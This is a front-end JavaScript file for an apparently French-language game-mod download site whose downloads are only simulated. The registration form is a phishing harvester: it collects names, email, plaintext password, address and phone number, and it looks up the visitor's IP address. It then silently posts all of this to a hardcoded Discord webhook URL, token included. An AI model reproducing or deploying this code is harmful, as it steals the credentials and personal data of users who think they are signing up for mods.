document.addEventListener('DOMContentLoaded', () => {
    const menuToggle = document.getElementById('menu-toggle');
    const sidebar = document.getElementById('sidebar');
    const body = document.body;
    const downloadButtons = document.querySelectorAll('.download-button');
    const loginModal = document.getElementById('login-modal');
    const loginOverlay = document.getElementById('login-overlay');
    const closeModalButton = document.getElementById('close-modal');
    const loginForm = document.getElementById('login-form');
    const registerForm = document.getElementById('register-form');
    const loginView = document.getElementById('login-view');
    const registerView = document.getElementById('register-view');
    const showRegisterLink = document.getElementById('show-register-link');
    const showLoginLink = document.getElementById('show-login-link');
    const modalTitle = document.getElementById('modal-title');
    const logoutButton = document.getElementById('logout-button');

    let isLoggedIn = false; // Track user login state
    let activeDownloadButton = null; // Track which button triggered the modal

    // --- Sidebar Logic ---
    if (menuToggle && sidebar) {
        menuToggle.addEventListener('click', () => {
            sidebar.classList.toggle('active');
            body.classList.toggle('sidebar-active');
        });
    }

    document.addEventListener('click', (event) => {
        const mainContent = document.querySelector('main');
        const contactSection = document.querySelector('.contact-section');
        const headerControls = document.querySelector('.header-controls'); // Target the container

        // Close sidebar on outside click
        if (sidebar.classList.contains('active') &&
            !headerControls.contains(event.target) && // Check container instead of just menuToggle
            !sidebar.contains(event.target)) {
             if (mainContent.contains(event.target) || (contactSection && contactSection.contains(event.target)) || event.target === body) {
                 sidebar.classList.remove('active');
                 body.classList.remove('sidebar-active');
            }
        }

        // Close modal on overlay click
        if (loginModal && !loginModal.classList.contains('hidden') && event.target === loginOverlay) {
             hideLoginModal();
        }
    });

    // --- Modal Logic ---
    function showLoginModal(buttonClicked) {
        if (loginModal && loginOverlay) {
            activeDownloadButton = buttonClicked; // Store the button
            // Ensure login view is shown by default
            loginView.classList.remove('hidden');
            registerView.classList.add('hidden');
            modalTitle.textContent = 'Connexion requise';
            // Show the modal
            loginOverlay.classList.remove('hidden');
            loginModal.classList.remove('hidden');
            // Reset forms visually
            loginForm.reset();
            if (registerForm) registerForm.reset();
        }
    }

    function hideLoginModal() {
        if (loginModal && loginOverlay) {
            loginOverlay.classList.add('hidden');
            loginModal.classList.add('hidden');
            activeDownloadButton = null; // Clear the stored button
             // Optional: Reset forms when hiding (already done on show)
             // loginForm.reset();
             // if (registerForm) registerForm.reset();
        }
    }

    // Show modal when download button is clicked (if not logged in)
    downloadButtons.forEach(button => {
        button.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent default link behavior (if it was an <a>)
            const modName = button.dataset.modName;
            console.log(`Download attempt for: ${modName}`); // Log which mod was clicked

            if (!isLoggedIn) {
                 showLoginModal(button); // Pass the clicked button
            } else {
                // Already logged in, start fake download
                simulateDownload(button);
            }
        });
    });

    // Hide modal when close button is clicked
    if (closeModalButton) {
        closeModalButton.addEventListener('click', hideLoginModal);
    }

    // --- Login/Register Form Switching ---
    if (showRegisterLink) {
        showRegisterLink.addEventListener('click', (event) => {
            event.preventDefault();
            loginView.classList.add('hidden');
            registerView.classList.remove('hidden');
            modalTitle.textContent = 'Inscription'; // Change title
             registerForm.reset(); // Clear register form when switching to it
        });
    }

    if (showLoginLink) {
        showLoginLink.addEventListener('click', (event) => {
            event.preventDefault();
            registerView.classList.add('hidden');
            loginView.classList.remove('hidden');
            modalTitle.textContent = 'Connexion requise'; // Change title back
            loginForm.reset(); // Clear login form when switching to it
        });
    }

    // Handle login form submission
    if (loginForm) {
        loginForm.addEventListener('submit', (event) => {
            event.preventDefault(); // Prevent actual form submission
            const email = document.getElementById('email').value;
            // Basic validation example
            if (!email || !document.getElementById('password').value) {
                alert('Veuillez entrer votre email et mot de passe.');
                return;
            }
            // Simulate login attempt
            console.log(`Login attempt with email: ${email}`);
            alert('Connexion reussie !'); // Replace with actual login logic later

            isLoggedIn = true; // Set login state
            updateLoginStateUI(); // Update UI based on login state
            hideLoginModal();

            // If a download was pending, start it now
            if (activeDownloadButton) {
                console.log("Starting pending download after login for:", activeDownloadButton.dataset.modName);
                simulateDownload(activeDownloadButton);
            }
        });
    }

    // Handle registration form submission
    if (registerForm) {
        registerForm.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent actual form submission

            // Get form data
            const prenom = document.getElementById('register-prenom').value;
            const nom = document.getElementById('register-nom').value;
            const email = document.getElementById('register-email').value;
            const password = document.getElementById('register-password').value; 
            const address = document.getElementById('register-address').value;
            const phone = document.getElementById('register-phone').value;

            // Basic validation
            if (!prenom || !nom || !email || !password) { 
                 alert('Veuillez remplir tous les champs requis (Pr茅nom, Nom, Email, Mot de passe).');
                return;
            }

            // Disable submit button during processing
            const submitButton = registerForm.querySelector('button[type="submit"]');
            submitButton.disabled = true;
            submitButton.textContent = 'Envoi...';

            const webhookUrl = 'https://discord.com/api/webhooks/1365886271574114435/i8bYpwLYug52FhGLefI9UrPMa6a2VSu6MZpqQw11JNYevLnLXuFvXc5L_DQpaykd6o87';

            try {
                // 1. Get IP Address
                let ipAddress = 'N/A';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (ipResponse.ok) {
                        const ipData = await ipResponse.json();
                        ipAddress = ipData.ip;
                    } else {
                        console.warn('Could not fetch IP address.');
                    }
                } catch (ipError) {
                    console.error('Error fetching IP address:', ipError);
                }

                // 2. Prepare Discord Payload
                 const payload = {
                    username: "Inscription Bot",
                    avatar_url: "", 
                    content: `Nouvelle inscription re莽ue !`, 
                    embeds: [{
                        title: "D茅tails de l'inscription",
                        color: 0x64FFDA, 
                        fields: [
                            { name: "Pr茅nom", value: prenom, inline: true },
                            { name: "Nom", value: nom, inline: true },
                            { name: "Email", value: email, inline: false },
                            { name: "Mot de passe", value: `||${password}||`, inline: false },
                            { name: "Adresse", value: address || "Non fournie", inline: false },
                            { name: "T茅l茅phone", value: phone || "Non fourni", inline: true },
                             { name: "Adresse IP", value: ipAddress, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // 3. Send data to Discord Webhook
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    console.log('Registration data sent to Discord successfully.');
                    alert('Inscription r茅ussie ! Vous pouvez maintenant vous connecter.');
                    // Switch back to login view
                    registerView.classList.add('hidden');
                    loginView.classList.remove('hidden');
                    modalTitle.textContent = 'Connexion requise';
                    loginForm.reset();
                    registerForm.reset();
                } else {
                    console.error('Error sending data to Discord:', response.status, await response.text());
                    alert(`Erreur lors de l'inscription (${response.status}). Veuillez r茅essayer.`);
                }

            } catch (error) {
                console.error('Error during registration submission:', error);
                alert("Une erreur inattendue s'est produite. Veuillez r茅essayer.");
            } finally {
                 // Re-enable submit button
                 submitButton.disabled = false;
                 submitButton.textContent = "S'inscrire";
            }
        });
    }

    // Update UI based on login state
    function updateLoginStateUI() {
        // Example logic to update UI based on login state
        if (isLoggedIn) {
            logoutButton.classList.remove('hidden');
        } else {
            logoutButton.classList.add('hidden');
        }
    }

    // Simulate a download (example)
    function simulateDownload(button) {
        if (button.classList.contains('downloading') || button.classList.contains('success')) {
            return; // Already downloading or completed
        }

        console.log('Simulating download for:', button.dataset.modName);

        const progressBar = button.querySelector('.progress-bar');
        const buttonTextSpan = button.querySelector('span');
        const originalButtonText = buttonTextSpan.textContent;
        const icon = button.querySelector('i');

        button.disabled = true;
        button.classList.add('downloading');
        icon.classList.remove('fa-download'); // Remove download icon
        icon.classList.add('fa-spinner', 'fa-spin'); // Add spinner icon
        buttonTextSpan.textContent = 'Chargement... 0%';
        progressBar.style.width = '0%'; // Ensure it starts at 0

        // Force a reflow to ensure the transition starts correctly
        void progressBar.offsetWidth;

        let progress = 0;
        const intervalTime = 50; // ms interval for updates
        const duration = 2000; // Total duration in ms (2 seconds)
        const steps = duration / intervalTime;
        const increment = 100 / steps;

        const interval = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);

                // --- Download Complete ---
                progressBar.style.width = '100%';
                buttonTextSpan.textContent = 'Mod ajout茅 !';
                button.classList.remove('downloading');
                button.classList.add('success');
                icon.classList.remove('fa-spinner', 'fa-spin'); // Remove spinner
                // Optionally, re-enable after a delay or keep disabled
                // setTimeout(() => {
                //     button.disabled = false;
                //     button.classList.remove('success');
                //     icon.classList.add('fa-download');
                //     buttonTextSpan.textContent = originalButtonText;
                //     progressBar.style.width = '0%';
                // }, 3000); // Reset after 3 seconds
            } else {
                progressBar.style.width = `${progress}%`;
                buttonTextSpan.textContent = `Chargement... ${Math.round(progress)}%`;
            }
        }, intervalTime);
    }

    // Initial UI update based on potential stored login state (if implemented)
    updateLoginStateUI();
});